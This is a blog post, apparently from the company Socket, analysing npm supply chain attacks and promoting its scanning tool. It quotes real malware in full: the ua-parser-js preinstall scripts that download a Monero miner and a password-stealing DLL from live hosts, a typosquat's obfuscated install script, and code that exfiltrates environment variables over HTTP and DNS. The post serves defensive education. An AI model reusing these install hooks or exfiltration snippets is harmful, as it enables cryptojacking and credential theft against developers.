@@ -1,0 +1,533 @@
+
+Let me tell you a story...#
+On January 13, 2012, over ten year ago, a developer named Faisal Salman published a new project to GitHub called ua-parser-js and it parsed user agent strings. Lots of people found this project useful. Over the next 10 years, Faisal continued to develop the package along with help from many open source contributors. It eventually grew to 7 million downloads per week and was used by nearly 3 million GitHub repositories.
+
+Now, let me tell you a different story...#
+On October 5th, 2021 on a notorious Russian hacking forum, this post appeared:
+
+I sell a development account on npmjs.com, more than 7 million installations
+every week, more than 1000 others are dependent on this.
+
+There is no 2FA on the account. Login and password access. The password is
+enough to change your email.
+
+Suitable for distributing installations, miners, creating a botnet
+
+Start $10k
+Step $1k
+Blitz $20k
+This hacker was offering to sell the password to an npm account that controlled a package with over 7 million weekly downloads. His asking price was $20,000 USD for the password.
+This is where the two stories intersect#
+Two weeks later, on Friday, October 22, 2021 at 12:15pm GMT, ua-parser-js was compromised. Three malicious versions were published – 0.7.29, 0.8.0, and 1.0.0 – which contained malware. The malware was particularly nasty and it caught everyone by surprise.
+Anatomy of a supply chain attack#
+Let's take a look at what that malware does. This is the package.json file for one of the compromised versions:
+package.json
+{
+  "title": "UAParser.js",
+  "name": "ua-parser-js",
+  "version": "0.7.29",
+  "author": "Faisal Salman <f@faisalman.com> (http://faisalman.com)",
+  "description": "Lightweight JavaScript-based user-agent string parser",
+  "main": "src/ua-parser.js",
+  "scripts": {
+    "preinstall": "start /B node preinstall.js & node preinstall.js",
+    "build": "uglifyjs src/ua-parser.js ...",
+    "test": "jshint src/ua-parser.js && mocha -R nyan test/test.js",
+    "test-ci": "jshint src/ua-parser.js && mocha -R spec test/test.js"
+  }
+}
+You'll see that it uses a pre-install script, so this means that the command start /B node preinstall.js & node preinstall.js will run automatically anytime this package is installed.
+Let's take a look at the preinstall.js script:
+preinstall.js
+const { exec } = require('child_process')
+
+function terminalLinux() {
+  exec('/bin/bash preinstall.sh', (error, stdout, stderr) => {
+    if (error) {
+      console.log(`error: ${error.message}`)
+      return
+    }
+    if (stderr) {
+      console.log(`stderr: ${stderr}`)
+      return
+    }
+    console.log(`stdout: ${stdout}`)
+  })
+}
+
+var opsys = process.platform
+if (opsys == 'darwin') {
+  opsys = 'MacOS'
+} else if (opsys == 'win32' || opsys == 'win64') {
+  opsys = 'Windows'
+  const { spawn } = require('child_process')
+  const bat = spawn('cmd.exe', ['/c', 'preinstall.bat'])
+} else if (opsys == 'linux') {
+  opsys = 'Linux'
+  terminalLinux()
+}
+The first thing you'll see is that it runs a different payload depending on the victim's operating system. On Linux, the malware executes preinstall.sh, while on Windows it executes preinstall.bat. Mac users got lucky – there was no Mac payload. Perhaps the attacker ran out of time to finish the Mac version, or didn't have a Mac to test on?
+Now let's take a look at what preinstall.sh does:
+preinstall.sh
+IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
+if [ -z "$IP" ]
+    then
+	var=$(pgrep jsextension)
+	if [ -z "$var" ]
+		then
+		curl http://159.148.186.228/download/jsextension -o jsextension
+		if [ ! -f jsextension ]
+			then
+			wget http://159.148.186.228/download/jsextension -O jsextension
+		fi
+		chmod +x jsextension
+		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
+            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
+	fi
+fi
+The very first line fetches the victim's country code using their IP address. If the victim is from Russia, Ukraine, Belarus, or Kazakhstan, then the malware exits early. Presumably the attacker comes from one of these countries and doesn't want to antagonize their local law enforcement. This is a common technique in malware.
+Next, there's a check using pgrep to see if the malware – a process named jsextension – is already running. If so, then the malware exits early.
+Otherwise, the script proceeds to download a file from an IP address, mark that file as executable, and then run it. Based on these command line flags, the program appears to be a Monero miner. This program will mine the Monero cryptocurrency for the attacker, wasting the victim's CPU cycles and potentially driving up their electricity or cloud hosting bill.
+The payload for Windows users is quite similar, with one extra twist:
+preinstall.bat
+@echo off
+curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe
+if not exist jsextension.exe (
+	wget http://159.148.186.228/download/jsextension.exe -O jsextension.exe
+)
+if not exist jsextension.exe (
+	certutil.exe -urlcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe
+)
+curl https://citationsherbe.at/sdd.dll -o create.dll
+if not exist create.dll (
+	wget https://citationsherbe.at/sdd.dll -O create.dll
+)
+if not exist create.dll (
+	certutil.exe -urlcache -f https://citationsherbe.at/sdd.dll create.dll
+)
+set exe_1=jsextension.exe
+set "count_1=0"
+>tasklist.temp (
+tasklist /NH /FI "IMAGENAME eq %exe_1%"
+)
+for /f %%x in (tasklist.temp) do (
+if "%%x" EQU "%exe_1%" set /a count_1+=1
+)
+if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
+   --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)
+del tasklist.temp
+On Windows, the malware not only downloads a Monero miner (jsextension.exe), but it downloads a .DLL file as well.
+After starting the Monero miner, the malware registers the .DLL file by running regsvr32.exe -s create.dll. This .DLL file steals passwords from over 100 different programs on the Windows machine as well as all the passwords in the Windows credential manager.
+Yikes!
+This is a really nasty piece of malware. Anyone unlucky enough to run this lost all their passwords and had to do a complete reset of their online accounts – not a fun time!
+Aftermath#
+The malicious package was available for about four hours. The open source community, as well as the maintainer, did quite well at finding and reporting the problem to npm who were able to remove it. Despite things going quite well by historical standards – 4 hours is a very quick turnaround time – tens of thousands of malicious downloads still took place. Even a few minutes is a lot of time for a package which gets 7 million weekly downloads!
+Anyone who ran npm install ua-parser-js was compromised. Anyone who installed a package that depended on ua-parser-js was also compromised, including important packages such as react-native. Anyone running npm install without a package-lock.json file was compromised. Anyone unlucky enough to update to a new version of ua-parser-js, whether manually with npm update or through an automated pull request such as from Dependabot, was compromised.
+Just the tip of the iceberg#
+This is really just the tip of the iceberg. At Socket, we've been tracking packages that are removed from npm for security reasons. We've seen over 700 packages removed for security reasons in the last 30 days, and this trend is accelerating.
+Attackers are taking advantage of the open ecosystem and the implicit trust that maintainers have for each other through the liberal contribution policies that have become common in the modern open source era.
+We predict that 2022 will be the "year of software supply chain security" as the awareness of this issue has exploded due to several massive software supply chain attacks such as SolarWinds as well as near weekly npm attacks in the news. It feels like we've reached a breaking point and developers, companies, and governments finally seem ready to take action to protect the open source ecosystem.
+One question you might ask, though, is...
+Why is this happening now?#
+I want to start by just pointing out that what we're trying to do here is kind of crazy. We want to:
+
+Download code
+from the internet
+written by unknown individuals
+that we haven't read
+that we execute
+with full permissions
+on our laptops and servers
+where we keep our most important data
+This is what we're doing every day when we use npm install. It's a miracle that this system works – and that it's continued to mostly work for this long!
+It's a testament to the fact that most people are good. But, unfortunately, not everyone is is good. And even more unfortunately, even just a small handful of bad actors in the ecosystem can cause massive supply chain attacks that shake our trust in open source code.
+Now let's let's dive into why this is happening now.
+1. 90% of the lines of code in your app comes from open source#
+We're standing on the shoulders of giants. Open source is the reason we can get an app off the ground in hours or days instead of weeks or months. It's the reason that we don't need to be an expert in cryptography or timezones or network protocols to build a powerful, modern software application.
+It's also the reason why your node_modules folder is one of the heaviest objects in the universe.
+2. Lots of transitive dependencies#
+Another reason is that we have lots and lots of transitive dependencies. The way that we write software has changed. We use dependencies a lot more liberally. Installing even a single dependency often leads to many dozens or hundreds of transitive dependencies coming in as well.
+A 2019 paper at USENIX, found that installing an average npm package introduces an implicit trust on 79 third-party packages and 39 maintainers.
+Here's another way to look at. We created a visualization to show you what the dependency tree of a typical package looks like. Let's look at webpack, which is a dependency present in many JavaScript projects.
+Each gray box represents a package and each purple box represents a file inside a package:
+Webpack, unpacked
+The visualization above is interactive. Drag to rotate. Click to navigate to a package or file.
+As you take away each layer of the dependency tree you'll see that you just keep finding more packages nested inside the top-level package, until you eventually get down to the bottom of the tree.
+There are an insane number of files and a lot of packages flying around here.
+3. No one reads the code#
+Another reason is that no one really reads the code. Of course, there are some people who do, but by-and-large, people don't look at the code that they're executing on their machines.
+One big reason for this is that npm really doesn't make this very easy. If you go to the package page for ua-parser-js and you click on the "Explore" tab, you'll see that you can't even see the files of the package:
+So, people have to resort to clicking the GitHub link in the sidebar and going to GitHub and hoping that the code on GitHub matches the code that's on npm, which is not necessarily true. In fact, many of the biggest npm supply chain attacks have taken advantage of this fact.
+The lack of people looking at the code inside of npm packages is also a big reason why, on average, npm malware lingers on the registry for 209 days before it's finally reported and removed.
+When I first read this statistic, I found it hard to believe, but it's been confirmed by further research.
+A 2021 paper at NDSS, a prestigious security conference, also found similar results. Even worse, they found that 20% of malware persist in package managers for over 400 days and have more than 1,000 downloads.
+It's disturbing to realize that npm is filled with landmines that can be set off inadvertently if we make a small typo in one of the many npm install commands we run on a daily basis.
+4. Popular tools give a false sense of security#
+And the fourth reason is that popular tools give a false sense of security. A lot of popular tools – such as Dependabot and Snyk – scan your dependencies for known vulnerabilities (CVEs). In 2022, this is no longer sufficient. We can't just scan for known vulnerabilities and stop there. And yet that's what the most popular supply chain security products do, leaving you vulnerable.
+It can take weeks or months for a vulnerability to be discovered, reported, and detected by tools. That's just not fast enough to stop supply chain attacks.
+Known vulnerabilities vs. Malware
+Let's take a second to quickly distinguish between known vulnerabilities and malware, because they're very different.
+Vulnerabilities are accidentally introduced by maintainers – the good guys. They have varying levels of risk and sometimes it's okay to intentionally ship a known vulnerability to production if it's low impact. Even if you have vulnerabilities in production they may not be discovered or exploited before you update to a fixed version. You usually have a bit of time to address these kinds of issues.
+Malware, on the other hand, is quite different. Malware is intentionally introduced into a package by an attacker – almost never the maintainer – and it will always end badly if you ship malware to production. You don't have a few days or weeks to mitigate the issue. You need to really catch it before you install it on your laptop or a production server.
+But in today's culture of fast development, a malicious dependency can be updated and merged in a very short amount of time, which leads to an increased risk of supply chain attacks because the quicker you update your dependencies the fewer eyeballs that have had a chance to look at the code.
+Developers need a new approach to detect and to block malicious dependencies. But before we get into that, let's look a little deeper into how a supply chain attack actually works.
+How does a supply chain attack actually work?#
+To answer this question, we downloaded every package on npm – 100 GB of metadata and 15 TB of package tarballs. We noticed a few trends in the types of attacks on npm.
+Let's go over the top 6 attack vectors (how the attack gets you to run their code) and attack techniques (what the attack code actually does).
+1. Typosquatting#
+The most common attack vector is typosquatting.
+Typosquatting is when an attacker publishes a package which has a very similar name to a legitimate and popular package.
+Take these two packages with very similar names, for instance:
+npm install noblox.js-proxied
+npm install noblox.js-proxy
+One of these is legitimate and one of these is malware. But which is which? And what if you can't remember and so you just take a guess?
+Hopefully you guessed right:
+npm install noblox.js-proxied (REAL)
+npm install noblox.js-proxy (EVIL)
+Let's crack open the malware package noblox.js-proxy and take a look at it's package.json:
+package.json
+{
+  "name": "noblox.js-proxy",
+  "version": "1.0.5",
+  "description": "A Node.js wrapper for Roblox. (original from sentanos) (proxy edition by DarkDev)",
+  "main": "lib/index.js",
+  "types": "typings/index.d.ts",
+  "scripts": {
+    "docs": "jsdoc -c jsDocsConfig.json -r -t ./node_modules/better-docs",
+    "lint": "eslint lib/",
+    "test": "jest",
+    "postinstall": "node postinstall.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/JxySerr1/noblox.js-proxy.git"
+  }
+}
+Again, you'll notice that it's using an install script – a very common technique that malware uses. If you open up this install script to look at the code, you'll find that the file is heavily obfuscated:
+(function(_0x249d1f,_0x2b8f5b){function _0x4c7bcc(_0xab39a4,_0x4f1570,_0x2f32bf,
+_0x4d98f7,_0x52a9ec){return _0x1efa(_0x52a9ec-0x379,_0x4d98f7);}function _0xfe08c3
+(_0x3d9d3c,_0x4ae939,_0x217de2,_0x4278ef,_0x1a1bd1){return _0x1efa(_0x3d9d3c- -0x30,
+_0x217de2);}function _0x5dee13(_0x3bf95a,_0x410ef5,_0x6d0f61,_0x402705,_0x3daba2)
+{return _0x1efa(_0x410ef5- -0x6c,_0x3daba2);}const _0x40a390=_0x249d1f();
+function _0x4ebfb2(_0x39433b,_0x180281,_0x29e008,_0x55bd13,_0x265536)
+{return _0x1efa(_0x180281-0x29c,_0x29e008);}function _0x1d9570(_0xcf31ba,_0x24a2a8,
+_0x1361be,_0x2b2b01,_0x2b71bd)
+{return _0x1efa(_0xcf31ba-0x357,_0x24a2a8);}while(!![]){try{const _0xe15807=
+-parseInt(_0x4ebfb2(0x718,0x638,'12Eh',0x6f0,0x6f6))/(0x1e27+-0x2ac+-0x1b7a)
++parseInt(_0x4c7bcc(0x6d5,0x713,0x72c,'JXxJ',0x644))/(0x15*-0x16e+-0x19c4+0x37cc)
++-parseInt(_0x4c7bcc(0x68d,0x788,0x86c,'JJ[O',0x754))/(-0x89e+0x2*-0x928+-0xb*-0x273)
+*(-parseInt(_0x4ebfb2(0x64f,0x62a,'$53b',0x530,0x55f))/(-0x2525+0x7c0+-0x1*-0x1d69))
++-parseInt(_0x4c7bcc(0x7d6,0x65e,0x7e5,'tOk*',0x729))/(0xc7d+0x7cc*-0x1+0x1*-0x4ac)
++-parseInt(_0x4ebfb2(0x544,0x602,'!qJ9',0x565,0x6c2))/(-0x120e+0x1b1*-0x17+0x1f7*0x1d)
++parseInt(_0xfe08c3(0x359,0x28a,'igej',0x404,0x3e9))/(0x163*-0x8+0x345+0x192*0x5)
++-parseInt(_0x4ebfb2(0x40f,0x519,'!@70',0x4f5,0x5a2))/(0x1*-0x977+-0x15a+0xad9);
+if(_0xe15807===_0x2b8f5b)break;else _0x40a390['push'](_0x40a390['shift']());}
+catch(_0xdc6a7c){_0x40a390['push'](_0x40a390['shift']());}}}(_0x6450,-0x4f0c0+
+0x260b+0x29*0x4445));const _0x206d7b=(function(){function _0x2debc5(_0x482afc,
+_0x3fd1d9,_0x38f5d5,_0x18ac59,_0x17d73a){return _0x1efa(_0x18ac59- -0x3d1,_0x17d73a);}
+...
+I can tell you that even without knowing exactly what this code is doing, you can bet this is not something that you want to run on your machine.
+2. Dependency confusion#
+This attack vector is pretty closely related to typosquatting. Dependency confusion happens when a company publishes packages to an internal npm registry and uses a name that hasn't yet been registered on the public npm registry. Later, an attacker can come along and register the available package. Now there's a private legitimate package and a public malware package, both with the same name.
+Many internal tools are poorly-written and they may prefer to install the public version of the package instead of the private one, which means that the attacker's code will be installed.
+Looking through the recently removed npm packages, we were able to find dozens of likely dependency confusion attacks, where package names appear to conflict with internal company package names. Major corporations, US federal agencies, and US government contractors were all affected.
+
+Yahooyahoo-react-inputyahoo-react-formsy-input
+
+yahoo-react-input
+yahoo-react-formsy-input
+EURid (registry manager for EU)eurid_cloudflare
+
+eurid_cloudflare
+18F (US Federal agency)18f-dashboard
+
+18f-dashboard
+Unity (game engine)com.unity.ide.vscodecom.unity.package-manager-uicom.unity.modules.aicom.unity.modules.androidjni
+
+com.unity.ide.vscode
+com.unity.package-manager-ui
+com.unity.modules.ai
+com.unity.modules.androidjni
+Palantir (government contractor)eslint-config-dev-palantir
+
+eslint-config-dev-palantir
+DuckDuckGo (search engine)duckduckgo-styles
+
+duckduckgo-styles
+Shippo (shipping company)shippo-frontend
+
+shippo-frontend
+GrubHub (food delivery company)@grubhubprod/umami-library@grubhubprod/order-taking-client-sdk@grubhubprod/mochi@grubhubprod/chiri
+
+@grubhubprod/umami-library
+@grubhubprod/order-taking-client-sdk
+@grubhubprod/mochi
+@grubhubprod/chiri
+Wix (website builder)wix-media-manager-backendwix-marketing-backendwix-events-backendwix-chat-backend
+
+wix-media-manager-backend
+wix-marketing-backend
+wix-events-backend
+wix-chat-backend
+How were attackers able to figure out these private package names? There are many possible ways, but it's worth noting that npm itself was leaking a subset of private package names for several weeks which didn't help the problem.
+3. Hijacked packages#
+The third vector that we see a lot is hijacked packages. These are the ones that you've probably seen in the news every few weeks.
+Criminals and miscreants find ways to infiltrate our communities and and infect popular packages. Once they get control of a package and they can publish to it, they'll steal credentials or install backdoors or abuse compute resources for cryptocurrency mining.
+This type of attack happens for various reasons:
+
+Maintainers choose weak passwords
+Maintainers reuse passwords
+Maintainers get malware on their laptops
+npm doesn't enforce 2FA for all accounts (though they've started to enforce this for top accounts)
+Maintainers give access to malicious actors
+Overworked maintainers are particularly susceptible to this type of attack. When someone offers a helping hand to a burned out maintainer, it's sometimes hard for them to say no.
+4. Install scripts#
+As we mentioned before, install scripts are a huge vector. An install script allows a package to automatically run code upon package installation.
+Most npm malware uses install scripts. In fact, 56% of malicious packages start their routines on installation.
+npm allows packages to run code during the installation process. Unfortunately, install scripts do have some legitimate uses, so we can't just remove this feature from npm without breaking the ecosystem. It's not an easy problem to solve.
+5. Permission creep (shell, network, filesystem, environment vars)#
+Permission creep happens when a package which previously didn't use privileged APIs, such as the shell, network, filesystem, or environment variables, but then suddenly starts to use these powerful APIs.
+Privileged APIs are used in most malware because attackers usually want to steal some secrets, download an executable payload, or run some shell scripts.
+Though legitimate packages do sometimes introduce privileged APIs in later package versions, this signal is often a telltale sign of malware, especially when these APIs are introduced in a patch version. Attackers like to publish their malware in a patch version to maximize the number of potential victims who will install it through loose semver ranges.
+Let's look at an example of a malicious package that uses privileged APIs:
+package.json
+{
+  "name": "<redacted>",
+  "version": "9998.9999.2",
+  "description": "...",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node dns.js | node index.js | node specific-fields.js"
+  },
+  "files": ["specific-fields.js", "index.js", "dns.js"],
+  "author": "",
+  "license": "ISC"
+}
+Again this is a standard install script attack vector. But it runs a few different payloads, each using a different technique.
+Let's look at the first:
+http.js
+const http = require('https')
+
+req = http
+  .request({
+    host: '34.195.72.180',
+    path: '/',
+    method: 'POST',
+    headers: {
+      host: '411c316239cf14afaa1f37bbc5666207.m.pipedream.net',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
+    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'
+    }
+  })
+  .on('error', function (err) {})
+
+req.write(Buffer.from(JSON.stringify(process.env)).toString('base64'))
+req.end()
+You can see that the malware collects the environment variables via process.env and then makes an HTTP request to exfiltrate the data to an IP address.
+But this malware also uses a backup exfiltration technique:
+dns.js
+var { Resolver } = require('dns')
+var zlib = require('zlib')
+
+var resolver = new Resolver()
+
+function splitString(string, size) {
+  var re = new RegExp('.{1,' + size + '}', 'g')
+  return string.match(re)
+}
+
+resolver.setServers(['165.232.68.239'])
+var d = process.env || {}
+var data = redactedForBrevity()
+
+var encData = zlib
+  .brotliCompressSync(Buffer.from(JSON.stringify(data)))
+  .toString('hex')
+
+var ch = splitString(encData, 60)
+
+var dt = Date.now()
+
+for (var i = 0; i < ch.length; i++) {
+  const domain = ['l' + dt, i + 1, ch.length, ch[i]].join('.')
+  resolver.resolve4(domain, function (err) {})
+}
+In addition to HTTP, it uses DNS to send the data to the attacker. This is useful when an firewall is present since these often don't block DNS lookups.
+To pull this off, the attacker uses a custom DNS resolver and puts the environment variables they're stealing into a subdomain.
+And finally, our last attack technique...
+6. Obfuscation#
+We already saw an example of this before. Obfuscated code makes it hard to audit code and decipher what it is doing. This can be used to hide malicious code from tools which use static analysis, such as Socket, although we have techniques to detect obfuscation and we use that as a strong negative signal.
+Another type of obfuscation is when attackers publish different code to npm than they publish on GitHub. When they do that, npm doesn't make it easy to see what code is actually in the npm package, and so a lot of people who are trying to evaluate a package will rely on the version of the code that's on GitHub. There's no guarantee that the code on GitHub is the same as the code on npm.
+Now let's talk about how you can protect your app.
+How can you protect your app from supply chain attacks?#
+We asked ourselves this question when we were working on Wormhole, which lets you share files with end-to-end encryption. Our goal was to make Wormhole the best way to send files, combining the usability of a web app with best-in-class security.
+As the frequency of npm supply chain attacks increased throughout 2021, we became concerned about the safety of our dependencies.
+We realized we needed to improve the way we vet our open source dependencies or else we would be leaving our user's security and privacy to chance. We didn't feel comfortable telling people to trust our service with their most precious data when malware could be lurking in any dependency update.
+We started thinking carefully about this problem space and started building solutions. Here are some of the things we did, and what you can do too:
+1. Change the way you think about dependencies#
+As an industry, we need a mindset shift around the way we use dependencies. Too many developers assume they can just install open source code from the internet and, barring bugs, it will always do what it says on the tin. Unfortunately, as we've seen, this just isn't true.
+Open source is like an all-you-can-eat buffet – no one will stop you from scooping an unlimited number of dependencies onto your plate. Of course, like a buffet, there are health consequences to overindulging. You take a small hit with each dependency you install.
+If you're shipping code to production that includes open source code, then you must treat the open source code as part of your app. You are ultimately responsible for the behavior of that code.
+The most popular open source license, the MIT license, actually literally says this:
+Most developers don't think of open source this, way but it's actually how it works.
+2. Dig deeper than the README#
+Many developers rely on heuristics to determine if a package is good:
+
+✅ Does it get the job done?
+✅ Does it have good docs?
+✅ Does it have lots of downloads and GitHub stars?
+✅ Does it have recent commits?
+✅ Does it have tests? Types?
+Checking for these things is good, but it's not enough to stop supply chain attacks. To stop attacks, you must dig deeper.
+We built a tool called Socket to help you do this.
+We built Socket to look for the markers present in the recent npm supply chain attacks (as discussed above). Unlike other tools such as Snyk or Dependabot, Socket analyzes the actual behavior of a package instead of relying on stale data from a known vulnerability (CVE) database. This way, we can detect and block attacks before they've been discovered by the community.
+You can use Socket to quickly evaluate the security of a package:
+In this example, you can see that bufferutil contains install scripts. It's called out prominently at the top of the page, along with a link to the exact code that will run when you run npm install bufferutil. In this instance, bufferutil's use of install scripts is legitimate, but it's nice to be able to know before you run npm install bufferutil that code will be immediately executed, as well as what that code will do, so that you can make an informed decision about whether to proceed.
+You'll also notice helpful Package Health scores at the top of the page.
+Now let's take a look at another example:
+The package angular-calendar is quite a useful package. It's a calendar web component that renders a little calendar widget.
+But, if you dig into its dependencies, you'll actually find that some of them have behavior that is potentially concerning:
+You can see here that one of angular-calendar's dependencies contains install scripts, runs shell scripts, accesses the file system, and accesses the network.
+This is probably not something that you would expect a web component to be doing, and so it may be worth some further investigation to figure out what's going on here before you use this package.
+Fortunately, Socket makes it easy to see which code is triggering a security issue. Just click any issue to jump straight to the line of code that is causing the issue.
+In this example, you can see the exact line of code where this package accesses the network, the shell, the filesystem, environment variables, and more.
+Socket makes it easy to get an idea of what a package will do before you install it.
+If you want to research packages on Socket to make an informed decision before you install them, you can do that by visiting socket.dev. Pro-tip: you can use our handy shortcut and just visit socket.dev/<package-name> to go straight to a package page. For example, try socket.dev/fastify.
+3. Update your dependencies at the right cadence#
+How quickly should you update your dependencies? This is a question that a lot of teams, including our own, struggled with.
+Should you err on the side of updating slowly or quickly?
+If you update slowly you're exposed to known vulnerabilities and you're running code that's old and may have bugs that have been fixed in a newer version. Not only that, if a security vulnerability is discovered in the future, being on a super old version will make it harder to update to take the security fix.
+On the other hand, if you update quickly you expose yourself to supply chain attacks because you're now running code that may have been published literally hours ago which means that very few, if any, eyeballs have had a chance to look at the code.
+This is a hard tradeoff to balance. Different teams will make different decisions.
+However, you can use Socket to help. With the Socket GitHub App, you can accept most dependency updates quickly – those where the package's capabilities have not changed – while reserving time to review more significant updates. This way you can spend your limited team resources auditing the highest-impact dependency updates, instead of choosing an all-or-nothing approach.
+4. Audit your dependencies#
+How closely should you audit a dependency before allowing it into your app?
+One option is to do a full audit – literally read every line of code in every dependency. Google is known to do a full audit and then to vendor their open source dependencies. This is great for preventing supply chain attacks but it takes a full-time team to manage this – the audits, the updates, the allowlist, applying critical security patches – and even still, Google is usually several major versions behind for most libraries. This approach is out of reach for all but the largest companies or the most security-critical applications (e.g. crypto wallets). It's lots of work, it's slow, it's expensive.
+On the other hand, doing nothing is also an option – and it's the one that most teams take. On most teams, any developer can install any dependency they want to get the job done. Most of the time, no one on the team even looks at the code in these dependencies before approving the pull request. As you might expect, this approach leaves you completely vulnerable to supply chain attacks, it's risky, and it can be expensive, albeit in the form of breaches, bad press, and government fines.
+Without tooling, this is a hard tradeoff to manage, which explains why most teams just do nothing.
+However, Socket can help here too. With the Socket GitHub App, you can accept most dependency updates without auditing the code – especially if there are no issues detected by Socket – while reserving time to review packages which have risky behavior such as using eval(), or that contain obscuted code. Socket helps you spend your limited team resources auditing the highest-impact dependency updates, instead of choosing an all-or-nothing approach.
+Find the happy medium with Socket#
+You don't need to throw your hands up in exasperation and do nothing about supply chain risk. We built Socket to be the antidote to an all-or-nothing approach.
+With the Socket approach:
+
+Use automation to automatically evaluate all dependencies
+Detect and block attacks such as malware, hidden code, typo-squatting, etc.
+Have humans manually audit suspicious packages (i.e. new capabilities added)
+Provide security information directly in pull request comments
+How to use Socket today#
+You can install Socket as a GitHub App. It will automatically evaluate all changes to package.json and other “package manifest” files such as package-lock.json and yarn.lock. Whenever a new dependency is added in a pull request, Socket will evaluate it and leave a comment indicating if it is a security risk.
+For example, say that you accidentally installed browserlist instead of browserslist, a very easy mistake to make. Socket will detect this and leave a comment in the pull request:
+With the Socket GitHub App in place, the developer who opened the pull request (or the developer reviewing it) will have their attention drawn to this typosquat issue. Socket doesn't get in the way, but it does augment your review process.
+Before we started building Socket, I found this exact typosquat issue in the popular preact package. It's an easy mistake to make, and that's probably why browserlist continues to be downloaded 15,000 times each week.
+This particular example with browserlist is not unique. There are hundreds of thousands of npm packages within 1-2 characters of each other, so this is a very easy mistake to make. Typosquatting is one of the most common supply chain attack vectors.
+Socket has 60 detections in five different categories – supply chain risk, quality, maintenance, known vulnerabilities, and license. Each of these issues won't immediately trigger an alert. Rather, we use each of these issues as one signal into supply chain risk formula that determines whether we will raise an issue to your attention. Socket aims to only raises high signal issues that are worth your precious time and attention.
+If you decide to install the Socket GitHub App, we're eager for your feedback. Please join our Discord (link in the footer) or send us an email.
+How much will Socket cost?#
+Open source package search with Socket Package Health Scores are free to everyone on our website, https://socket.dev.
+Socket integrations, such as the GitHub App, are free for open source repositories, forever. For private repositories, Socket is free while we're in beta. We're still working out pricing; we're aiming to keep it affordable so every team can get protected.
+We can improve supply chain security, together!#
+The open source ecosystem faces an unprecedented supply chain security threat but all hope is not lost. As developers, we can take responsibility for our software supply chain and help make the world a safer place.
+P.S. We're hiring at Socket! Check out our jobs page if you're interested in working to secure the software supply chain.
+This blog post was originally presented by Feross at Node Congress 2022.
+ua-parser-js
+ua-parser-js
+0.7.29
+0.8.0
+1.0.0
+package.json
+package.json
+start /B node preinstall.js & node preinstall.js
+preinstall.js
+preinstall.js
+preinstall.sh
+preinstall.bat
+preinstall.sh
+preinstall.sh
+pgrep
+jsextension
+preinstall.bat
+jsextension.exe
+regsvr32.exe -s create.dll
+npm install ua-parser-js
+ua-parser-js
+react-native
+npm install
+package-lock.json
+ua-parser-js
+npm update
+npm install
+node_modules
+webpack
+ua-parser-js
+npm install
+noblox.js-proxy
+package.json
+package.json
+
+yahoo-react-input
+yahoo-react-formsy-input
+yahoo-react-input
+yahoo-react-formsy-input
+
+eurid_cloudflare
+eurid_cloudflare
+
+18f-dashboard
+18f-dashboard
+
+com.unity.ide.vscode
+com.unity.package-manager-ui
+com.unity.modules.ai
+com.unity.modules.androidjni
+com.unity.ide.vscode
+com.unity.package-manager-ui
+com.unity.modules.ai
+com.unity.modules.androidjni
+
+eslint-config-dev-palantir
+eslint-config-dev-palantir
+
+duckduckgo-styles
+duckduckgo-styles
+
+shippo-frontend
+shippo-frontend
+
+@grubhubprod/umami-library
+@grubhubprod/order-taking-client-sdk
+@grubhubprod/mochi
+@grubhubprod/chiri
+@grubhubprod/umami-library
+@grubhubprod/order-taking-client-sdk
+@grubhubprod/mochi
+@grubhubprod/chiri
+
+wix-media-manager-backend
+wix-marketing-backend
+wix-events-backend
+wix-chat-backend
+wix-media-manager-backend
+wix-marketing-backend
+wix-events-backend
+wix-chat-backend
+package.json
+http.js
+process.env
+dns.js
+bufferutil
+npm install bufferutil
+bufferutil
+npm install bufferutil
+angular-calendar
+angular-calendar
+socket.dev/<package-name>
+eval()
+package.json
+package-lock.json
+yarn.lock
+browserlist
+browserslist
+preact
+browserlist
+browserlist
